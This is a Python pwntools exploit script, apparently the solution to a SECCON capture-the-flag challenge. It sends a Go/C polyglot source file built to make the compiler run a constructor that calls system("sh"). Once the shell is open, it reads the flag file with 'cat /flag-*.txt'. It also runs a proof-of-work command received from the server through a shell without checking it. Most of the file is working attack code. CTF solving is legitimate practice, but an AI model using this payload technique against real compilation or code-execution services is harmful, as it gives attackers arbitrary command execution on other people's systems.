import pwn
import os
import subprocess
import time

pwn.context.log_level = "debug"

code = """
//\\
package main
/*#define main
#include"main.go"
__attribute__ func func constructor))f func)<%system func"sh");}*///\\
import "C"//\\
/*
#define/**/func main(//\\
){}
""".strip()
print(f"len: {len(code)}")  # 165

io = pwn.remote(
    os.getenv("SECCON_HOST", "localhost"),
    os.getenv("SECCON_PORT", "5000"),
)

# PoW
pow_cmd = io.recvuntil(b"solution: ").decode().splitlines()[1]
io.sendline(subprocess.run(pow_cmd, shell=True, capture_output=True).stdout)

# Exploit
io.recvuntil(b":")
for line in code.splitlines():
    io.sendline(line.encode())
io.sendline(b"__EOF__")
time.sleep(1)

io.sendline(b"cat /flag-*.txt")
io.sendline(b"exit")

print(io.recvuntil(b"Executed").decode().strip())
